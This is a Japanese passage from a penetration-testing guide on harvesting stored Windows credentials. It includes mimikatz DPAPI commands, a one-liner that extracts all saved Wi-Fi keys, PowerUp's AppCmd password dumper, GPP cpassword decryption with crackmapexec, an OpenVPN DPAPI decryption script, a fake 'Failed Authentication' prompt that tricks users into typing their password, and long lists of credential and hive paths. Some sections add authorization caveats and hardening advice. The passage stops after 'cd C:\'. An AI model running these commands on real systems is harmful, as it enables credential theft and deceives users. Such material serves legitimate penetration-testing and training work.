**Data Protection API (DPAPI)** は、データを対称暗号化するための仕組みです。主に Windows オペレーティングシステム内で、非対称秘密鍵の対称暗号化に使用されます。この暗号化では、ユーザーまたはシステムの秘密情報を利用して、エントロピーを大幅に高めます。

**DPAPI は、ユーザーのログイン秘密情報から導出された対称鍵を使って、鍵を暗号化します**。システム暗号化の場合は、システムのドメイン認証秘密情報を使用します。

DPAPI を使用して暗号化されたユーザーの RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**同じファイル内でユーザーの秘密鍵を保護するマスターキーとともに保存される DPAPI キー**は、通常、64 バイトのランダムデータで構成されています。（このディレクトリへのアクセスは制限されているため、CMD で `dir` コマンドを実行しても内容を一覧表示できませんが、PowerShell では一覧表示できます。）

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** `dpapi::masterkey` を使用すると復号できます。

**マスターパスワードで保護された資格情報ファイル**は、通常次の場所にあります。

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

**mimikatz module** `dpapi::cred` と適切な `/masterkey` を使って復号できます。\
`sekurlsa::dpapi` module を使うと、**memory** から多数の DPAPI **masterkeys** を**抽出**できます（root 権限がある場合）。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された認証情報を便利に保存する方法として、**スクリプト作成**や自動化タスクでよく使われます。認証情報は **DPAPI** で保護されており、通常は作成時と同じコンピューター上の同じユーザーでのみ復号できます。

エクスポートされた認証情報のファイル名や `.xml` のパスは任意です。スクリプトやファイルの一覧から該当ファイルが見つかった場合は、`C:\Users` と決めつけず、対象アカウントの実際のプロファイルディレクトリを確認してください：[Windows ではプロファイルを別の場所に配置できます](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)。ファイルを読み取れることは手掛かりにすぎません。[Windows の `Export-Clixml` は、暗号化された認証情報をエクスポートしたユーザーとコンピューターに紐付けます](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml)。また、復元したアカウントに対象サービスへの有効な権限があるかは、別途確認が必要です。通常の調査では、暗号化値や平文値を出力せず、まずパスと ACL を確認してください。

ファイルに含まれる PS credentials を**復号**するには、次のようにします：

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### 保存済みのRDP接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\ にあります\
また、`HKCU\Software\Microsoft\Terminal Server Client\Servers\` にもあります

### 最近実行したコマンド

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **リモート デスクトップ資格情報マネージャー**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** の `dpapi::rdg` module を適切な `/masterkey` とともに使用して、**.rdg ファイルを復号**します。\
Mimikatz の `sekurlsa::dpapi` module を使うと、メモリから多くの DPAPI masterkey を**抽出**できます。

**mRemoteNG は別の接続ストアを使用します。** `%APPDATA%\mRemoteNG` とユーザーの Documents にある読み取り可能な XML を調べます。`config.xml` のような一般的な名前のファイルも対象に含めてください。XML ファイルを認証情報の手掛かりとして扱う前に、接続スキーマと暗号化された `Password` 属性を特定します。保存された値は DPAPI/RDCMan のパスワードではありません。復元できるかどうかは、ファイルの暗号化設定と、カスタム master password が使用されたかどうかによります。広範な列挙の際に、暗号化された値を出力しないでください。

**Remote Desktop Plus のプロファイルエクスポート**も、ユーザーディレクトリや共有管理フォルダーに読み取り可能な状態で保存されている場合があります。旧形式の `profiles.xml` エクスポートには、`ProfileName`、`Password`、`Secure` 要素を含む `Data/Profile` エントリがあります。空でない password 要素は認証情報の手掛かりとして扱い、値を出力したり、平文だと決めつけたりしないでください。[ベンダーの説明](https://www.donkz.nl/)によると、プロファイルの保護は作成時のアカウントとコンピューターに紐付けることも、より緩い設定にすることもできます。利用する前に、ファイルの出所と復元条件を確認してください。

### Sticky Notes

Sticky Notes アプリにパスワードなどの情報を保存している場合があります。Microsoft のパッケージ版 Sticky Notes アプリでは、通常、ノートは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` に保存されます。古いアプリや別のアプリでは、LevelDB を含む他のユーザープロファイル内ストアが使われる場合があります。SQLite ファイルが見つからないことをノートが存在しない証拠として扱う前に、インストール済みのアプリとストレージ形式を特定してください。

Sticky Notes が SQLite の write-ahead logging を使用している場合、`plum.sqlite` だけをコピーすると、最近コミットされたノートが含まれないことがあります。データベースの整合性が保たれたコピーとともに、対応する `plum.sqlite-wal` を保持してください。利用可能であれば `plum.sqlite-shm` も含めます。共有メモリのインデックスは再構築できますが、WAL はデータベースの永続状態の一部です。[SQLite の WAL ドキュメント](https://www.sqlite.org/wal.html)を参照してください。アカウント名やパスワードを含むノートは、あくまで認証情報の手掛かりです。アカウント、許可されたアクセス権、パスワードの再利用については、それぞれ別途確認してください。暗号化された password-manager のレコードから、より高い権限のログインを確認するには、実際の復号キーとアプリケーション固有の解釈も必要です。

### AppCmd.exe

**AppCmd.exe からパスワードを復元するには、Administrator であり、High Integrity level で実行する必要があることに注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、いくつかの**認証情報**が設定されており、**復元**できる可能性があります。

このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました：

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します .\
インストーラーは **SYSTEM 権限で実行されるため、DLL Sideloading に脆弱なものが多くあります（情報元:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## ファイルとレジストリ（認証情報）

### サポートツールのレジストリに残る認証情報の痕跡

古いリモートサポート環境では、固定されたアプリケーションレジストリキーの下に、パスワード関連の値名が残っていることがあります。たとえば、[ベンダーによるレジストリキーの説明](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988)によると、TeamViewerの`SecurityPasswordAES`は、バージョン9より前では設定済みの静的セッションパスワードを示していました。値名のマーカーは調査の手掛かりにすぎません。認証情報を評価する前に、インストールされているバージョン、値データの読み取り可否と形式、現在の認証動作を確認してください。リモートサポートのパスワードから、より高い権限を持つWindowsアカウントに至るには、そのアカウントで実際にパスワードが再利用されており、そのアカウントへのアクセスが許可されている必要もあります。通常の列挙出力に暗号文や復元したパスワードを含めないでください。

### 保護されたシートを含む共有スプレッドシート

読み取り可能な共有ブックにアカウントデータが含まれている可能性がある場合は、**ファイルの暗号化**と、ワークシートの保護や非表示列を区別してください。[Microsoftによると](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel)、ワークシートの保護は編集を制御するものであり、セキュリティ機能ではありません。それだけではブックの内容が暗号化されていることを意味しません。許可された関連ファイルのみを確認し、広範な列挙中に候補となる秘密情報を表示しないでください。読み取り可能な`.xlsx`のパス、保護されたシート、または非表示列だけでは、認証情報の存在も、いずれかのアカウントがより高い権限を持つことも証明できません。実際のデータと現在のアカウント権限を個別に確認してください。

### CIサーバーに残る変更パッチ

CIサーバーは、ビルド完了後もデータディレクトリ内に送信されたソース変更を保持していることがあります。[TeamCityのドキュメント](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html)では、`system/changes`はremote-runの変更を保存する場所とされています。データディレクトリは設定可能であり、必ずしも`ProgramData`配下にあるとは限りません。読み取り可能なパッチには、認証情報ファイル、暗号化キー、または両方を使用するスクリプトへの参照が、削除または追加された形で残っていることがあります。たとえば、PowerShellの`ConvertTo-SecureString -Key`ワークフローでは、暗号化文字列に加えてAESキーも必要です。[Microsoftのドキュメント](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)では、キーは別途指定すると説明されています。まずアクセス可能なパッチ名だけを確認し、許可を得たうえで関連する内容を調べてください。通常の列挙出力に秘密情報を表示しないでください。パッチのパス、暗号化された値、またはキーへの参照だけでは、有効な認証情報や高い権限のアクセスを証明できません。データディレクトリのACLを制限し、ビルド変更に秘密情報をコミットしないでください。

### 独自のローカル管理者パスワードローテーション

自作のパスワードローテーターは、暗号化されたローカル管理者パスワードをローカルサービスに保存し、データストアの認証情報を読み取り可能な`.env`ファイルまたはアップデーターのバイナリの隣に置いている場合があります。アップデーターのスケジュールタスク、アカウント、設定ファイルのACL、リスナー、データストアの権限を合わせて確認してください。ループバック限定のデータストアでも、有効な認証情報を持つローカルユーザーから到達可能です。ただし、認証できることだけでは、該当レコードを読み取る権限があるとは限りません。暗号化シードや鍵素材が暗号文の隣からアクセスできる場合は、その暗号化を信頼する前に、実際の鍵導出方法を確認してください。公開されたシードからGoの[`math/rand`](https://pkg.go.dev/math/rand)を使ってAESキーを決定論的に導出する方式は、そのパスワードの保護には不適切です。Goのドキュメントでも、このパッケージはセキュリティ上重要な乱数生成には不適切とされています。復元したパスワードを昇格経路とみなす前に、現在も有効であり、ローカルのAdministratorsグループに属するアカウントのものだと確認してください。スケジュールタスク、`.env`のパス、暗号化されたblobだけでは、これらの条件は証明されません。通常の列挙出力にパスワードや鍵素材を含めないでください。

管理対象のローカル管理者パスワードには[Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview)を使用してください。ディレクトリまたはEntraを利用した保存先とアクセス制御は、独自のローカルデータストアとは別のものです。同様に、[Elasticsearchのロール](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/)によって、認証済みのデータストアユーザーが特定のインデックスを読み取れるかどうかが決まります。

### Javaサーバーのプラグインアーカイブと認証情報の再利用

一部のJavaサーバープラグインは、サーバーの`plugins`ディレクトリにJARアーカイブとして配布されています。読み取り可能なカスタムプラグインには、サービス認証情報が設定やバイトコードに埋め込まれている場合があります。許可されている場合に限ってアーカイブを確認し、復元した秘密情報を通常の列挙出力に含めないでください。プラグインのパスだけでは秘密情報の存在を証明できません。また、復元したサービスパスワードから高い権限を得るには、より高い権限を持つアカウントでもそのパスワードが有効である必要があります。該当ファイルのACLを確認し、再利用されている認証情報を別々の秘密情報に置き換えてください。ディレクトリ構成については[PaperMCのプラグインインストールガイド](https://docs.papermc.io/paper/adding-plugins/)、アーカイブの内容については[OracleのJARドキュメント](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html)を参照してください。

### Openfireの組み込みデータベース認証情報

組み込みデータベースを使用するOpenfireのインストール環境では、`openfire.script`が`Openfire\embedded-db`に保存されている場合があります。現在のアカウントで読み取り可能なら、`OFUSER`レコードと`passwordKey`プロパティを合わせて確認してください。Openfireの[ユーザープロバイダーのドキュメント](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html)によると、パスワードは平文で保存することも、このプロパティに格納されたキーで暗号化することもできます。復元したパスワードが昇格に関係するのは、より高い権限を持つIDで現在も有効な場合に限られます。ファイル名だけでは、読み取りアクセスも認証情報の再利用も証明できません。このパスはインベントリ調査の手掛かりです。通常の列挙出力にデータベースの内容や認証情報を含めないでください。

別のファイルである`Openfire\conf\openfire.xml`には、外部データベースを使用している場合でも、管理コンソールに設定されたポートとバインドインターフェースが記載されていることがあります。Openfireの管理コンソールは通常ループバックにバインドされますが、リスナーが稼働していれば、ローカルアカウントからそのアドレスに接続できます。実際のリスナー、許可された管理者ロール、プラグインのアップロードポリシー、Openfireサービスの実行IDを合わせて確認してください。プラグインをインストールできる管理者は、サービスのコンテキストでプラグインコードを実行させられる可能性があります。サービスがLocalSystemとして実行されている場合、そのコンテキストは非常に高い権限を持つことがあります。一致するアカウントパスワードや読み取り可能な設定ファイルのパスだけでは、管理コンソールへのアクセスやコード実行を証明できません。ベンダーの[インストールおよびプラグイン管理ガイド](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)と[プラグインアップロードAPIのプロパティ](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html)を参照してください。

### フォレンジック管理サーバーの設定

一般に`server.config.yaml`という名前のVelociraptorサーバー設定には、内部CAの`CA.private_key`が含まれることがあります。低権限ユーザーがそのキーを読み取れる場合、APIクライアント証明書を発行できる可能性があります。これが高い権限につながるかどうかは、サーバーのユーザーロール、APIへの到達可能性、サーバーまたは対象エージェントの実行IDによって異なります。クライアント設定には別の情報が含まれます。クライアント設定が見つかっても、サーバーCAへのアクセスを証明するものではありません。CAの秘密鍵をオフラインで保管している環境もあるため、読み取り可能なサーバー設定に署名鍵が含まれていないこともあります。

Windowsサーバーでは、インストールディレクトリ内の**サーバー**設定と、保護されたバックアップコピーのACLを確認してください。場所の例は`%ProgramFiles%\VelociraptorServer\server.config.yaml`です。異なる場合は、サービスに設定されたパスを使用してください。現在のIDでファイルを読み取れること、および`CA.private_key`が実際に含まれていることを確認してください。ログや列挙出力に秘密鍵を表示しないでください。ベンダーの`config api_client`ワークフローではCAキーを使ってクライアント証明書を発行しますが、有効なサーバー側ロールも必要です。そのロールの作成や変更には、データストアへの書き込み権限や再起動が必要になる場合があります。そうした書き込みができなくても、既存の高権限サーバーIDが経路となることがあります。実行権限を持つAPIクエリは、該当するサーバーまたはエージェントのコンテキストで実行され、非常に高い権限を持つことがあります。

サーバー設定とバックアップは制限的なACLで保護し、可能な場合はCA署名鍵をオフラインで保管してください。また、APIロールとリスナーへのアクセスを制限してください。[Velociraptor APIドキュメント](https://docs.velociraptor.app/docs/server_automation/server_api/)および[セキュリティ設定ガイダンス](https://docs.velociraptor.app/docs/deployment/security/)を参照してください。

### Puttyの認証情報

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTYは独立したセッションマネージャーです。ネイティブの暗号化ストアは`%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`にある場合があります。一方、エクスポートしたセッションのバックアップは`sessions-backup.dat`という名前で、別の場所に保存されていることがあります。[SolarWindsのエクスポートガイド](https://thwack.solarwinds.com/discussion/comment/115591)によると、エクスポートファイルはパスワードで暗号化され、セッション、キー、スクリプト、タグ、関連情報を含む場合があります。[サポートフォーラム](https://thwack.solarwinds.com/discussion/4520/saved-session-lost)では、ネイティブストアの場所が示されています。まずファイルのアクセス許可とパスを確認してください。いずれかのファイルが見つかっても、パスワードが判明するわけではなく、保存された認証情報が現在も有効であることや、より高い権限を持つことが証明されるわけでもありません。

### PuTTY SSHホストキー

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### レジストリ内の SSH keys

SSH private keys はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されている場合があるため、興味深い情報がないか確認してください。

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

そのパス内にエントリが見つかった場合、おそらく保存済みの SSH key です。暗号化されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使って簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` サービスが実行されておらず、起動時に自動的に開始するには、次を実行します:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> この technique はもう有効ではないようです。ssh keys を作成し、`ssh-add` で追加してから、ssh 経由でマシンにログインしようとしました。レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、非対称鍵認証中に `dpapi.dll` が使用された形跡も procmon では確認できませんでした。

### 無人インストールファイル

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

これらのファイルは、**metasploit**を使って検索することもできます: _post/windows/gather/enum_unattend_

サンプルの内容:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM のバックアップ

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

読み取り可能な Windows Imaging（`.wim`）バックアップファイルには、オフラインの `SAM`、`SECURITY`、`SYSTEM` ハイブが含まれていることもあります。ローカルからアクセス可能なバックアップディレクトリやイメージディレクトリを優先し、何かを抽出する前にイメージの**メンバー名**を確認してください。`.wim` というファイル名だけではハイブが露出している証拠にはならず、通常の `install.wim`、`boot.wim`、リカバリーイメージは誤検知につながりがちです。SMB share は別のアクセス経路であり、その share が対象範囲に含まれる場合にのみ確認してください。Microsoft の[Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images)と[registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives)を参照してください。

### クラウド認証情報

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml**という名前のファイルを検索します。

### キャッシュされた GPP パスワード

以前は、Group Policy Preferences (GPP) を使って、複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOL に XML ファイルとして保存された Group Policy Objects (GPO) に、ドメインユーザーなら誰でもアクセスできました。次に、GPP 内のパスワードは、公開されている既定のキーを使って AES256 で暗号化されていましたが、認証済みユーザーなら誰でも復号できました。ユーザーが昇格した権限を取得できる可能性があり、これは深刻なリスクとなっていました。

このリスクを軽減するため、空でない「cpassword」フィールドを含む、ローカルにキャッシュされた GPP ファイルをスキャンする関数が開発されました。そのようなファイルが見つかると、関数はパスワードを復号し、カスタムの PowerShell オブジェクトを返します。このオブジェクトには、GPP の詳細とファイルの場所が含まれており、このセキュリティ上の脆弱性の特定と修正に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista より前)_ で、以下のファイルを検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexec を使ってパスワードを取得する:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

認証情報を含む web.config の例:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot 内のバックアップアーカイブ

Webroot に直接配置された古い ZIP バックアップから、過去の設定ファイルや再利用可能な認証情報が漏えいする可能性があります。漏えいと判断する前に、サイトに設定された物理パスと、アーカイブが HTTP 経由で実際にアクセス可能かどうかを確認してください。デフォルトの `C:\inetpub\wwwroot` は候補にすぎません。簡単なローカルインベントリを実行すれば、アーカイブを開かずに名前とサイズを一覧表示できます。

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

アーカイブ名だけでは、秘密情報が含まれていることや、復元した認証情報によって権限が上がることは確認できません。

### OpenVPN 認証情報

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### ログ

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### 認証情報を尋ねる

ユーザーが知っていると思われる場合は、**自分の認証情報、あるいは別のユーザーの認証情報を入力するよう、いつでも尋ねることができます**（ただし、クライアントに**認証情報**を直接**尋ねる**のは、非常に**リスクが高い**ことに注意してください）：

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **資格情報を含む可能性のあるファイル名**

以前に**パスワード**が**平文**または**Base64**で含まれていたことが確認されているファイル

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 のデータベースでは、一般に `.psafe3` 拡張子が使われます。一致するファイル名は暗号化された vault の候補として扱ってください。そのファイルが存在しても、読み取り、ロック解除、または保存された認証情報の使用が可能だとは限りません。このようなファイルの保存場所を確認する際は、アクセス可能なユーザープロファイルと設定済みのファイル共有ルートを調べてください。

読み取り可能な KeePass `.kdbx` も、暗号化された vault の手掛かりにすぎません。ロック解除には、実際の master password と、設定されている場合は key-file またはアカウント要素が必要です。許可されたレビューでエントリ内に LM:NT hash ペアが見つかった場合は、[pass-the-hash](../ntlm/README.md#pass-the-hash) を検討する前に、記載されたアカウントを確認し、NT hash が最新で、対象の NTLM サービスで受け入れられるかを確かめてください。vault のエントリだけでは、Administrator や SYSTEM の権限は得られません。リモートサービスへのアクセス、アカウント権限、および別途必要なサービス実行手順も、すべて満たす必要があります。インベントリには vault のパスと読み取り可否を記録し、データベースや保存された認証情報は出力しないでください。

候補となるファイルをすべて検索してください:

```
cd C:\
